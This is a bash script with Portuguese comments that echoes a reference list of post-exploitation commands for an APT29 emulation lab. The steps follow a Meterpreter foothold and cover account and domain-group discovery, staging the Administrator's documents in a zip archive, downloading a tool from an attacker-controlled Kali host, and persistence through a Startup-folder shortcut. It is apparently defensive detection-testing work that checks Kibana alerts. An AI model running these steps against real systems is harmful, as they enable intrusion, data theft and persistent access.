#!/bin/bash
# =============================================================================
# apt29-ttps.sh — APT29 Manual TTPs Execution Script
# Adversary Defense Lab — APT29 Cozy Bear Emulation
#
# Este script documenta os comandos executados manualmente na sessão
# Meterpreter após o payload ter estabelecido o C2.
#
# Uso:
#   Este script é uma referência dos comandos a executar na shell
#   do Meterpreter. Não é executado directamente no Kali.
#
#   1. Abre a sessão Meterpreter com auto-lnk.sh
#   2. Usa os comandos abaixo como referência fase a fase
#
# Pré-requisitos:
#   - Sessão Meterpreter activa como LAB\Administrator
#   - Servidor HTTP a correr no Kali na porta 8080
#
# TTPs cobertos:
#   T1087, T1069, T1082, T1057, T1012,
#   T1560, T1105, T1547.009
# =============================================================================

echo "============================================================"
echo "  APT29 TTPs Execution Guide"
echo "  Execute estes comandos na sessão Meterpreter activa"
echo "============================================================"
echo ""

echo "[FASE 3] DISCOVERY"
echo "------------------------------------------------------------"
echo ""
echo "[T1087] Account Discovery"
echo "  meterpreter > shell"
echo "  C:\> net user"
echo "  C:\> net user /domain"
echo ""
echo "[T1069] Permission Groups Discovery"
echo "  C:\> net group \"Domain Admins\" /domain"
echo "  C:\> net group \"Enterprise Admins\" /domain"
echo ""
echo "[T1082] System Information Discovery"
echo "  C:\> systeminfo"
echo ""
echo "[T1057] Process Discovery"
echo "  C:\> tasklist"
echo "  C:\> tasklist /v"
echo ""
echo "[T1012] Registry Query"
echo "  C:\> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion"
echo "  C:\> reg query HKLM\SYSTEM\CurrentControlSet\Services"
echo ""

echo "[FASE 4] COLLECTION E PERSISTENCE"
echo "------------------------------------------------------------"
echo ""
echo "[T1560] Archive Collected Data"
echo "  C:\> \"C:\Program Files\7-Zip\7z.exe\" a -tzip C:\Users\Public\data.zip C:\Users\Administrator\Documents\*"
echo ""
echo "[T1105] Ingress Tool Transfer"
echo "  C:\> powershell.exe"
echo "  PS C:\> Invoke-WebRequest -Uri \"http://192.168.10.102:8080/ds7002.zip\" -OutFile \"C:\Users\Public\tool.zip\""
echo ""
echo "[T1547.009] Startup Persistence"
echo "  PS C:\> Expand-Archive -Path \"C:\Users\Administrator\Downloads\ds7002.zip\" -DestinationPath \"C:\Users\Administrator\Downloads\ds7002\\\" -Force"
echo "  PS C:\> Copy-Item \"C:\Users\Administrator\Downloads\ds7002\ds7002.lnk\" \"C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\\""
echo ""

echo "============================================================"
echo "  Verifica os alertas no Kibana após execução"
echo "  http://192.168.10.20:5601 -> Security -> Alerts"
echo "============================================================"
